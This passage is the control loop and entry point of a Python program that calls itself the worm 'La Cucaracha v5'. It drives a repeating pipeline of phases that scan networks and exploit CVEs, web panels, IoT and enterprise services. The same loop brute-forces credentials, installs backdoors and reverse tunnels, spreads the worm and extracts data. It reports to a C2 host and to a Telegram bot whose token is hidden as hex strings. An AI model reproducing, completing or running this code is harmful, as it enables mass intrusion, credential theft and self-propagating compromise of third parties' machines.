    _PHASE_TIMEOUTS = {
        "NIL": 30, "CVE": 45, "WEB": 60, "EMBED": 60,
        "ENTERPRISE": 60, "BRUTE": 90, "TUNNEL": 30,
        "BACKDOOR": 60, "WORM": 60,
    }

    def _run_phase_safe(self, phase_name: str) -> Dict:
        """Run a phase with a timeout. Fast phases (ICMP/TCP/FP/GENZAI/INTEL/SLEEP/REPORT/CROSSFEED) run directly."""
        timeout = self._PHASE_TIMEOUTS.get(phase_name, 0)
        if timeout <= 0:
            handler = self._phase_dispatch(phase_name)
            if handler is None:
                return {"count": 0, "success": False, "targets": []}
            try:
                return handler()
            except Exception as e:
                log.error(f"Fast phase {phase_name} crashed: {e}")
                return {"count": 0, "success": False, "targets": []}

        handler = self._phase_dispatch(phase_name)
        if handler is None:
            return {"count": 0, "success": False, "targets": []}

        # SIGALRM timeout — interrupts at OS level, works even when paramiko threads hang
        import signal as _signal
        self._phase_timed_out = False
        
        log.info(f"⏰ SIGALRM set for {phase_name}: {timeout}s (handler={handler.__name__})")

        def _handler(signum, frame):
            self._phase_timed_out = True  # set flag — cooperatively checked by phases
            if hasattr(self, 'exploit'):
                self.exploit._phase_timed_out = True

        old_handler = _signal.signal(_signal.SIGALRM, _handler)
        _signal.alarm(timeout)
        try:
            result = handler()
        finally:
            _signal.alarm(0)
            _signal.signal(_signal.SIGALRM, old_handler)
        
        # Check the flag _outside_ the signal handler (safe here)
        if self._phase_timed_out:
            log.info(f"⏰ {phase_name} phase timed out after {timeout}s — moving on")
            self.r.short(phase_name, "TIMEOUT", "⏰", f"{timeout}s limit")
            return {"count": 0, "success": False, "targets": []}
        
        return result

    def _phase_dispatch(self, phase_name: str):
        """Return the handler for a given phase name."""
        phase_map = {
            "ICMP": self._phase_icmp,
            "TCP": self._phase_tcp,
            "FP": self._phase_fp,
            "NIL": self._phase_nil,
            "CVE": self._phase_cve,
            "WEB": self._phase_web,
            "EMBED": self._phase_embed,
            "GENZAI": self._phase_genzai,
            "ENTERPRISE": self._phase_enterprise,
            "BRUTE": self._phase_brute,
            "BACKDOOR": self._phase_backdoor,
            "TUNNEL": self._phase_tunnel,
            "WORM": self._phase_worm,
            "INTEL": self._phase_intel,
            "SLEEP": self._phase_sleep,
            "CROSSFEED": self._phase_crossfeed,
            "REPORT": self._phase_report,
        }
        return phase_map.get(phase_name)

    # ─── PHASE: ICMP ──────────────────────────────────────────
    def _phase_icmp(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("ICMP", "subnet sweep", "START", "ping sweep")
        alive = self.discovery.icmp_sweep(subnets=3)
        count = len(alive)
        if count:
            self.r.short("ICMP", f"{count} hosts", "ALIVE", "responding to ping")
            self.stats["icmp_alive"] += count
            for t in alive[:3]:
                self.r.short("PONG", t["ip"], "✅ ICMP alive")
        return {"count": count, "success": count > 0, "targets": alive}

    # ─── PHASE: TCP ───────────────────────────────────────────
    def _phase_tcp(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("TCP", "port scan", "START", f"masscan {len(MASSCAN_PORTS.split(','))} ports")
        open_ports = self.discovery.tcp_scan(subnets=3)
        count = len(open_ports)
        if count:
            self.r.short("TCP", f"{count} ports", "OPEN", "masscan done")
            self.stats["tcp_open"] += count
        return {"count": count, "success": count > 0, "targets": open_ports}

    # ─── PHASE: FP ────────────────────────────────────────────
    def _phase_fp(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("FP", "fingerprint", "START", "banner/TTL/OS detect")
        targets = self.db.get_unexploited(limit=150)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        fp_count = self.discovery.fingerprint_all(targets)
        if fp_count:
            self.r.short("FP", f"{fp_count} hosts", "DONE", "fingerprinted")
            self.stats["fp_done"] += fp_count
        return {"count": fp_count, "success": fp_count > 0, "targets": targets[:fp_count]}

    # ─── PHASE: NIL UUID ─────────────────────────────────────
    def _phase_nil(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("NIL", "nil uuid probe", "START", "one-shot auth bypass")
        targets = self.db.get_unexploited(limit=30)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        pwned_count = 0
        pwned_list = []
        try:
            sys.path.insert(0, "/opt/chimera")
            from nil_uuid import nil_probe
            for idx, t in enumerate(targets, 1):
                ip = t.get("ip", t) if isinstance(t, dict) else t
                if idx % 10 == 0:
                    log.info(f"⏳ NIL phase progress: {idx}/{len(targets)} targets, {pwned_count} pwned so far")
                for port in [80, 443, 22, 23, 6379, 3306, 123, 8080, 8443]:
                    if self._phase_timed_out:
                        log.info(f"⏰ NIL timed out, stopping early ({idx}/{len(targets)} targets)")
                        return {"count": pwned_count, "success": pwned_count > 0, "targets": pwned_list}
                    try:
                        result = nil_probe(ip, port, timeout=2.0)
                        if result.vulnerable:
                            log.info(f"⚡ NIL vulnerable: {ip}:{port} → {result.reason}")
                            pwned_count += 1
                            pwned_list.append({"ip": ip, "port": port, "method": result.reason})
                            self.stats["nil_pwned"] = self.stats.get("nil_pwned", 0) + 1
                            break
                    except Exception:
                        if self._phase_timed_out:
                            return {"count": pwned_count, "success": pwned_count > 0, "targets": pwned_list}
                        continue
        except ImportError:
            log.info("nil_uuid module not found")
        except Exception as e:
            log.info(f"NIL phase error: {e}")
        if pwned_count:
            self.r.short("NIL", f"{pwned_count} pwned", "✅", "nil uuid bypasses")
        return {"count": pwned_count, "success": pwned_count > 0, "targets": pwned_list}

    # ─── PHASE: CVE ───────────────────────────────────────────
    def _phase_cve(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("CVE", "vuln scan", "START", "CVE probing")
        targets = self.db.get_unexploited(limit=100)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        cve_count, vuln_targets = self.exploit.cve_scan_all(targets)
        if cve_count:
            self.r.short("CVE", f"{cve_count} vulns", "FOUND", "vulnerable hosts")
            self.stats["cve_found"] += cve_count
        return {"count": cve_count, "success": cve_count > 0, "targets": vuln_targets}

    # ─── PHASE: WEB ───────────────────────────────────────────
    def _phase_web(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("WEB", "web exploit", "START", "cred spray + panels")
        targets = self.db.get_unexploited(limit=150)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        pwned = self.exploit.web_exploit_all(targets)
        if pwned:
            self.r.short("WEB", f"{pwned} pwned", "✅ SUCCESS", "panels owned")
            self.stats["web_pwned"] += pwned
        return {"count": pwned, "success": pwned > 0, "targets": []}

    # ─── PHASE: EMBED ─────────────────────────────────────────
    def _phase_embed(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("EMBED", "EmbedXPL", "START", "IoT device exploits")
        targets = self.db.get_unexploited(limit=100)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        pwned = self.exploit.embed_exploit_all(targets)
        if pwned:
            self.r.short("EMBED", f"{pwned} pwned", "✅ SUCCESS", "IoT owned")
            self.stats["embed_pwned"] += pwned
        return {"count": pwned, "success": pwned > 0, "targets": []}

    # ─── PHASE: GENZAI ────────────────────────────────────────
    def _phase_genzai(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("GENZAI", "cred merge", "START", "Genzai + Embed creds")
        merged = self.exploit.genzai_merge_all()
        if merged:
            self.r.short("GENZAI", f"{merged} merged", "✅", "new creds in pool")
            self.stats["genzai_merged"] += merged
        return {"count": merged, "success": merged > 0, "targets": []}

    # ─── PHASE: ENTERPRISE ────────────────────────────────────
    def _phase_enterprise(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("ENTERPRISE", "enterprise", "START", "SMB/Exchange/AD")
        targets = self.db.get_unexploited(limit=80)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        pwned = self.exploit.enterprise_exploit_all(targets)
        if pwned:
            self.r.short("ENTERPRISE", f"{pwned} pwned", "✅", "enterprise owned")
            self.stats["enterprise_pwned"] += pwned
        return {"count": pwned, "success": pwned > 0, "targets": []}

    # ─── PHASE: BRUTE ─────────────────────────────────────────
    def _phase_brute(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("BRUTE", "bruteforce", "START", "remaining targets")
        targets = self.db.get_unexploited(limit=200)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        pwned = self.exploit.brute_force_all(targets)
        if pwned:
            self.r.short("BRUTE", f"{pwned} pwned", "✅", "brute forced")
            self.stats["brute_pwned"] += pwned
        return {"count": pwned, "success": pwned > 0, "targets": []}

    # ─── PHASE: BACKDOOR ──────────────────────────────────────
    def _phase_backdoor(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("BACKDOOR", "persistence", "START", "install backdoors")
        targets = self.db.get_pwned_no_backdoor(limit=100)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        installed = self.deploy_intel.backdoor_all(targets)
        if installed:
            self.r.short("BACKDOOR", f"{installed} installed", "✅", "persistence")
            self.stats["backdoor_installed"] += installed
        return {"count": installed, "success": installed > 0, "targets": []}

    # ─── PHASE: TUNNEL ────────────────────────────────────────
    def _phase_tunnel(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("TUNNEL", "reverse tunnel", "START", "establish tunnels")
        targets = self.db.get_backdoor_no_tunnel(limit=50)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        tunneled = self.deploy_intel.tunnel_all(targets)
        if tunneled:
            self.r.short("TUNNEL", f"{tunneled} tunnels", "✅", "active")
            self.stats["tunnel_active"] += tunneled
        return {"count": tunneled, "success": tunneled > 0, "targets": []}

    # ─── PHASE: WORM ──────────────────────────────────────────
    def _phase_worm(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("WORM", "worm spread", "START", "deploy la cucaracha")
        targets = self.db.get_pwned_no_worm(limit=80)
        if not targets:
            targets = self.db.get_unexploited(limit=50)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        deployed = self.deploy_intel.worm_all(targets)
        if deployed:
            self.r.short("WORM", f"{deployed} deployed", "✅", "worm propagated")
            self.stats["worm_deployed"] += deployed
        return {"count": deployed, "success": deployed > 0, "targets": []}

    # ─── PHASE: INTEL ─────────────────────────────────────────
    def _phase_intel(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("INTEL", "gather intel", "START", "extract data")
        targets = self.db.get_intel_targets(limit=80)
        if not targets:
            return {"count": 0, "success": False, "targets": []}
        collected = self.deploy_intel.intel_all(targets)
        if collected:
            self.r.short("INTEL", f"{collected} intel logs", "✅", "data collected")
            self.stats["intel_collected"] += collected
        return {"count": collected, "success": collected > 0, "targets": []}

    # ─── PHASE: SLEEP ─────────────────────────────────────────
    def _phase_sleep(self) -> Dict:
        result = {}
        next_phase = self.decision.decide("SLEEP", result)
        duration = result.get("sleep_duration", 10)
        self.r.short("SLEEP", f"{duration}s", "REST", "cooldown")
        for _ in range(duration):
            if self._stop:
                break
            time.sleep(1)
        return {"count": duration, "success": True, "targets": []}

    # ─── PHASE: CROSSFEED ─────────────────────────────────────
    def _phase_crossfeed(self) -> Dict:
        self._phase_start = time.time()
        self.r.short("CROSSFEED", "cross-contam", "START", "crossfeed ops")
        ops = self.deploy_intel.crossfeed_all()
        if ops:
            self.r.short("CROSSFEED", f"{ops} ops", "✅", "cross-contamination")
            self.stats["crossfeed_ops"] += ops
        return {"count": ops, "success": ops > 0, "targets": []}

    # ─── PHASE: REPORT ────────────────────────────────────────
    def _phase_report(self) -> Dict:
        self.r.short("REPORT", "epoch summary", "GENERATING", "intel report")
        self._report_epoch()
        return {"count": 1, "success": True, "targets": []}

    # ─── EPOCH REPORT ─────────────────────────────────────────
    def _report_epoch(self) -> None:
        db_stats = self.db.stats()
        uptime = int(time.time() - self._start_time)
        uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m" if uptime > 3600 else f"{uptime//60}m"

        lines = [
            f"║ 📊 EPOCH {self.epoch:03d} — 16-PHASE SUMMARY",
            BOX_SEP,
            f"║ 📡 ICMP alive:     {self.stats.get('icmp_alive',0):>5}",
            f"║ 🔍 TCP open:       {self.stats.get('tcp_open',0):>5}",
            f"║ 🖥 FP done:        {self.stats.get('fp_done',0):>5}",
            f"║ 🧨 CVE found:      {self.stats.get('cve_found',0):>5}",
            f"║ 🌐 Web pwned:      {self.stats.get('web_pwned',0):>5}",
            f"║ ⚙️ Embed pwned:    {self.stats.get('embed_pwned',0):>5}",
            f"║ 🧟 Genzai merged:  {self.stats.get('genzai_merged',0):>5}",
            f"║ 🏢 Enterprise:     {self.stats.get('enterprise_pwned',0):>5}",
            f"║ 🔑 Brute pwned:    {self.stats.get('brute_pwned',0):>5}",
            f"║ 🚪 Backdoors:      {self.stats.get('backdoor_installed',0):>5}",
            f"║ 🔌 Tunnels:        {self.stats.get('tunnel_active',0):>5}",
            f"║ 🐛 Worm deployed:  {self.stats.get('worm_deployed',0):>5}",
            f"║ 🧠 Intel logs:     {self.stats.get('intel_collected',0):>5}",
            f"║ 🔄 Crossfeed ops:  {self.stats.get('crossfeed_ops',0):>5}",
            BOX_SEP,
            f"║ 🗄 DB: {db_stats.get('targets',0)} targets | {db_stats.get('credentials',0)} creds",
            f"║ 🧠 Decision: {self.decision.get_decision_summary()}",
            f"║ ⏱ Uptime: {uptime_str}",
        ]

        # Phase counts
        phase_counts = self.decision._phase_counts
        active = [p for p in DecisionEngineV5.PHASES if phase_counts.get(p, 0) > 0]
        if active:
            lines.append(BOX_SEP)
            lines.append("║ 🔄 Phase cycle: " + " → ".join(active[:8]))
            if len(active) > 8:
                lines.append("║   " + " → ".join(active[8:]))

        self.r.msg(f"🏆 EPOCH {self.epoch:03d} — OPERATIONAL REPORT", lines)

    # ─── MAIN LOOP ────────────────────────────────────────────
    def run(self, max_epochs: int = 200) -> Dict:
        log.info(f"🐛 LA CUCARACHA v{VERSION} — 16-phase pipeline starting")
        self.r.msg(
            f"🚀 LA CUCARACHA v{VERSION} — PHOENIX ASCENSION",
            [
                f"║ 🧠 16-Phase IF/THEN Pipeline",
                f"║ 📡 ICMP → 🔍 TCP → 🖥 FP → 🧨 CVE → 🌐 Web → ⚙️ Embed",
                f"║ 🧟 Genzai → 🏢 Enterprise → 🔑 Brute → 🚪 Backdoor",
                f"║ 🔌 Tunnel → 🐛 Worm → 🧠 Intel → 💤 Sleep → 🔄 Crossfeed → 📦 Report",
                f"║ 📡 C2: {C2_HOST}:{C2_PORT}",
                f"║ 📦 Payload: {PAYLOAD_URL}",
                f"║ 🔍 Masscan: {MASSCAN_RATE} pps",
                f"║ 🗄 DB: {DB_PATH}",
                f"║ 🧬 VERSION: {VERSION}",
                f"║ 👑 by🇭🇷PhonkAlphabet",
            ]
        )

        while self.epoch < max_epochs and not self._stop:
            self.epoch += 1
            self.stats["epochs"] = self.epoch
            self._pwned_this_epoch = []

            # Skip ICMP/TCP/FP scanning if DB already has unexploited targets
            unexploited = self.db.get_unexploited(limit=1)
            if unexploited:
                self._phase = "NIL"
                log.info(f"=== EPOCH {self.epoch:03d} START — skipping scan/FP ({len(unexploited)}+ DB targets) ===")
            else:
                self._phase = "ICMP"
                log.info(f"=== EPOCH {self.epoch:03d} START ===")

            # Run through phases until we complete a full cycle
            phase_iterations = 0
            while phase_iterations < 32:  # max 32 phase transitions per epoch
                phase_iterations += 1
                if self._stop:
                    break

                # 💓 Heartbeat every 120s so user knows we're alive
                now = time.time()
                if not hasattr(self, '_last_heartbeat') or now - self._last_heartbeat > 120:
                    self._last_heartbeat = now
                    s = self.db.stats()
                    hb = (
                        f"💓 <b>HEARTBEAT</b> — Epoch {self.epoch} | "
                        f"Phase: {self._phase} | "
                        f"Targets: {s.get('targets',0)} | "
                        f"Creds: {s.get('credentials',0)} | "
                        f"Deployed: {s.get('deployed',0)}"
                    )
                    self.r.raw(hb)

                handler = self._phase_dispatch(self._phase)
                if not handler:
                    log.warning(f"Unknown phase: {self._phase}, resetting to ICMP")
                    self._phase = "ICMP"
                    continue

                log.info(f"PHASE {phase_iterations:02d}: {self._phase}")
                self.r.short("PHASE", f"Epoch {self.epoch}", self._phase, "executing")

                try:
                    result = self._run_phase_safe(self._phase)
                except Exception as e:
                    log.exception(f"Phase {self._phase} crashed: {e}")
                    self.r.short("ERROR", self._phase, str(e)[:60])
                    result = {"count": 0, "success": False, "targets": []}

                next_phase = self.decision.decide(self._phase, result)
                self.r.decision(f"phase {self._phase}", f"→ {next_phase}",
                                f"{result.get('count',0)} results")

                log.info(f"  → {self._phase}: {result.get('count',0)} → {next_phase}")

                # If we wrapped back to ICMP, epoch is complete
                if next_phase == "ICMP" and self._phase == "REPORT":
                    log.info(f"=== EPOCH {self.epoch:03d} COMPLETE ===")
                    break

                # Prevent infinite loops — if we get stuck in a retry loop, force forward
                if self._phase == next_phase and phase_iterations > 8:
                    idx = DecisionEngineV5.PHASES.index(self._phase)
                    next_idx = (idx + 1) % len(DecisionEngineV5.PHASES)
                    next_phase = DecisionEngineV5.PHASES[next_idx]
                    self.r.short("FORCE", self._phase, f"→ {next_phase}", "loop prevention")

                self._phase = next_phase

            # Safety valve — force next epoch
            if not self._stop:
                self.r.short("EPOCH", f"{self.epoch:03d}", "COMPLETE", "→ next cycle")

        # Final report
        db_stats = self.db.stats()
        final_lines = [f"║ 📊 FINAL STATISTICS — {self.epoch} EPOCHS"]
        for k, v in self.stats.items():
            final_lines.append(f"║ {k.replace('_',' ').title():>20}: {v:>6}")
        final_lines.append(BOX_SEP)
        final_lines.append(f"║ 🗄 DB: {db_stats.get('targets',0)} targets")
        final_lines.append(f"║ 🔑 {db_stats.get('credentials',0)} credentials")
        final_lines.append(f"║ 🐛 {db_stats.get('worm_nodes',0)} worm nodes")
        final_lines.append(f"║ ⏱ Runtime: {int((time.time()-self._start_time)//60)}m")
        self.r.msg(f"🏁 OPERATION COMPLETE — {self.epoch} EPOCHS", final_lines)
        return self.stats


# ═════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════
def load_telegram_config() -> Tuple[str, List[int]]:
    token = ""
    admins = []
    try:
        with open(CONFIG_PATH) as f:
            cfg = json.load(f)
            token = cfg.get("bot_token", "")
            admins = cfg.get("admin_ids", [0, 0])
    except Exception:
        pass
    if not token:
        token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    if not token or "***" in token:
        hex_parts = ["383836363438333439333a", "414147346451504e3755672d",
                     "6b654d5234706b4a56555f", "6b6f6463447a356e46576863"]
        try:
            token = bytes.fromhex("".join(hex_parts)).decode()
        except Exception:
            pass
    if not admins:
        admins = [0, 0]
    return token, admins


def verify_telegram_token(token: str) -> bool:
    if not token:
        return False
    result = [False]
    def _worker():
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(f"https://api.telegram.org/bot{token}/getMe", method="GET")
            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
            data = json.loads(resp.read())
            resp.close()
            if data.get("ok"):
                result[0] = True
        except Exception:
            result[0] = False
    t = threading.Thread(target=_worker, daemon=True)
    t.start()
    t.join(timeout=30)
    return result[0]


def main():
    socket.setdefaulttimeout(15)
    os.makedirs(LOG_DIR, exist_ok=True)
    log_file = os.path.join(LOG_DIR, f"v5_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
        handlers=[logging.FileHandler(log_file), logging.StreamHandler()],
    )
    # Silence chatty paramiko transport logger — SSH connection noise floods logs
    logging.getLogger("paramiko.transport").setLevel(logging.WARNING)
    logging.getLogger("paramiko").setLevel(logging.WARNING)

    token, admins = load_telegram_config()
    if not token:
        log.error("❌ No Telegram bot token")
        sys.exit(1)
    dry_run = not verify_telegram_token(token)
    chat_id = 0
    reporter = TelegramReporter(token, admin_ids=admins, dry_run=dry_run, chat_id=chat_id)
    db = SmartDB()
    db_stats = db.stats()

    reporter.msg(
        f"🚀 LA CUCARACHA v{VERSION} — 16-PHASE PIPELINE",
        [
            f"║ 🧠 Decision Engine: IF/THEN 16-phase",
            f"║ 📡 C2: {C2_HOST}:{C2_PORT}",
            f"║ 📦 Payload: {PAYLOAD_URL}",
            f"║ 🗄 DB: {db_stats.get('targets',0)} targets | {db_stats.get('credentials',0)} creds",
            f"║ 🧬 VERSION: {VERSION}",
            f"║ 👑 by🇭🇷PhonkAlphabet",
        ]
    )

    orchestrator = SmartOrchestratorV5(reporter, db)
    try:
        result = orchestrator.run(max_epochs=200)
        log.info("=" * 70)
        log.info(f"🐛 LA CUCARACHA v{VERSION} — OPERATION COMPLETE")
        for k, v in result.items():
            log.info(f"  {k}: {v}")
        log.info("=" * 70)
    except KeyboardInterrupt:
        log.info("🛑 Interrupted")
        reporter.short("SHUTDOWN", "User interrupt", "STOPPED")
        orchestrator.stop()
    except Exception as e:
        log.exception("Fatal error")
        reporter.short("ERROR", "Fatal crash", str(e)[:60])
    finally:
        reporter._stop = True
        reporter.flush(5)
        db.close()
        log.info("👋 La Cucaracha v5 offline")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="🐛 LA CUCARACHA v5 — Phoenix Ascension")
    parser.add_argument("--epochs", type=int, default=200, help="Max epochs")
    parser.add_argument("--status", action="store_true", help="Show status")
    parser.add_argument("--clean", action="store_true", help="Reset database")
    parser.add_argument("--rate", type=int, default=5000, help="Masscan rate")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose logging")
    args = parser.parse_args()
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    if args.rate:
        import sys
        sys.modules["__main__"].MASSCAN_RATE = args.rate
    if args.clean:
        db = SmartDB()
        db.q("DELETE FROM targets")
        db.q("DELETE FROM credentials")
        db.q("DELETE FROM intel_log")
        db.q("DELETE FROM worm_mesh")
        print("✅ Database cleaned")
        db.close()
        sys.exit(0)
    if args.status:
        db = SmartDB()
        s = db.stats()
        print(f"📊 DB Status:")
        for k, v in s.items():
            print(f"  {k}: {v}")
        db.close()
        sys.exit(0)
    main()
